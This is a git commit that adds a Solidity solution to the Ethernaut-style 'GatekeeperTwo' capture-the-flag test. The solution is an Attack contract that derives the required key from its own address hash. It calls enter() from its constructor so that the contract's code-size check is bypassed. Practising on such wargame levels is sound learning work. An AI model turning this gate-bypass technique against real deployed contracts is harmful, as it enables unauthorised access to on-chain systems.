0ebfe2148c75fab185cbd6dd1efa3d9cbf1423bd
vesla0x1 <vesla0x1@gmail.com>
2025-02-19 19:57:43 -0300

    feat: add GatekeeperTwo solution

--- test/14_GatekeeperTwo.t.sol
+++ test/14_GatekeeperTwo.t.sol
@@ -4,6 +4,16 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {GatekeeperTwo} from "../src/14_GatekeeperTwo.sol";
 
+contract Attack {
+    constructor(GatekeeperTwo target) {
+        bytes8 key = bytes8(
+            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
+            ^ type(uint64).max
+        );
+        target.enter(key);
+    }
+}
+
 contract TestGatekeeperTwo is Test {
     address public player = address(0xbad);
     GatekeeperTwo public instance;
@@ -17,6 +27,7 @@ contract TestGatekeeperTwo is Test {
         vm.startPrank(player);
 
         // Your exploit goes here
+        new Attack(instance);
 
         vm.stopPrank();
         assertNotEq(instance.entrant(), address(0));
